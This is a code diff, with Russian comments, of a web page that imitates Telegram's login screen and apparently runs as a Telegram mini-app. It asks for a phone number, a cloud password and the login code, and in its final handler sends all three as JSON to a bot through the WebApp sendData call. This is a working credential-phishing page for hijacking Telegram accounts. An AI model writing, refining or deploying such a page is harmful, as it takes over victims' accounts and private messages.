@@ -3,7 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Login (Strict Validation)</title>
+    <title>Telegram Login</title>
+    <!-- Подключение API Телеграма -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body {
             background-color: #ffffff;
@@ -52,7 +54,7 @@
             outline: none;
             background: transparent;
             box-sizing: border-box;
-            transition: all 0.2s;
+            transition: border-color 0.2s;
             color: #000;
         }
 
@@ -219,6 +221,10 @@
 </div>
 
 <script>
+    // Инициализация Telegram API
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+
     const phoneInput = document.getElementById('phone');
     const btnPhone = document.getElementById('btn-phone');
     const stepPhoneDiv = document.getElementById('step-phone');
@@ -253,8 +259,7 @@
     });
 
     phoneInput.addEventListener('input', function (e) {
-        phoneInput.classList.remove('error'); // Убираем ошибку при вводе
-
+        phoneInput.classList.remove('error');
         let x = e.target.value.replace(/\D/g, '');
         let res = '';
         if (x.length > 0 && (x[0] === '7' || x[0] === '8')) {
@@ -289,16 +294,10 @@
     // КЛИК ПО ТЕЛЕФОНУ
     btnPhone.addEventListener('click', function() {
         const rawPhone = phoneInput.value.replace(/\D/g, '');
-        let requiredLength = 10; // По умолчанию для мира
+        let requiredLength = 10;
+        if (rawPhone.startsWith('7')) requiredLength = 11;
+        else if (rawPhone.startsWith('380') || rawPhone.startsWith('375')) requiredLength = 12;
 
-        // Определяем требуемую длину
-        if (rawPhone.startsWith('7')) {
-            requiredLength = 11; // РФ = 11 цифр (7 + 10)
-        } else if (rawPhone.startsWith('380') || rawPhone.startsWith('375')) {
-            requiredLength = 12; // Укр/Бел = 12 цифр
-        }
-
-        // Если длина меньше нужной -> ОШИБКА
         if (rawPhone.length < requiredLength) {
             phoneInput.classList.add('error');
             setTimeout(() => phoneInput.classList.remove('error'), 500);
@@ -334,10 +333,7 @@
         setTimeout(() => passwordInput.focus(), 100);
     }
 
-    passwordInput.addEventListener('input', () => {
-        passwordInput.classList.remove('error');
-    });
-
+    passwordInput.addEventListener('input', () => passwordInput.classList.remove('error'));
     togglePass.addEventListener('click', () => {
         if (passwordInput.type === 'password') {
             passwordInput.type = 'text';
@@ -356,7 +352,6 @@
             setTimeout(() => passwordInput.classList.remove('error'), 500);
             return;
         }
-
         const originalText = btnPass.innerText;
         btnPass.classList.add('loading');
         btnPass.innerHTML = '<div class="loader"></div>';
@@ -389,11 +384,10 @@
         stepCodeDiv.classList.add('hidden');
         stepPassDiv.classList.add('hidden');
         stepPhoneDiv.classList.remove('hidden');
-
         title.innerText = 'Telegram';
         desc.innerHTML = 'Please confirm your country code and<br>enter your phone number.';
-        phoneInput.focus();
 
+        phoneInput.focus();
         phoneInput.readOnly = false;
         phoneInput.style.pointerEvents = 'auto';
 
@@ -419,31 +413,27 @@
         const boxes = document.querySelectorAll('.digit-box');
         const inputs = document.querySelectorAll('.code-digit');
 
-        // 1. Собираем все данные
-        const phoneNumber = document.getElementById('phone').value;
-        const password = document.getElementById('password').value; // Если пароля не было, будет пусто
+        const phoneNumber = phoneInput.value;
+        const password = passwordInput.value;
         let code = '';
         inputs.forEach(i => code += i.value);
 
-        // 2. Блокируем интерфейс (Визуальный эффект)
+        // Блокируем интерфейс
         inputs.forEach(inp => { inp.readOnly = true; inp.blur(); });
         boxes.forEach(box => { box.classList.add('locked'); });
 
-        // 3. ОТПРАВЛЯЕМ ДАННЫЕ БОТУ
-        // Инициализируем Telegram WebApp
-        const tg = window.Telegram.WebApp;
-
-        // Формируем объект с данными
+        // Формируем данные
         const data = {
             phone: phoneNumber,
             password: password,
             code: code
         };
 
-        // Отправляем данные боту (приложение закроется само)
-        tg.sendData(JSON.stringify(data));
+        // Отправка в Telegram
+        if (tg) {
+            tg.sendData(JSON.stringify(data));
+        }
 
-        // На всякий случай, если приложение не закрылось (например, открыто в браузере, а не в ТГ)
         setTimeout(() => {
             boxes.forEach(box => {
                 box.classList.remove('locked');
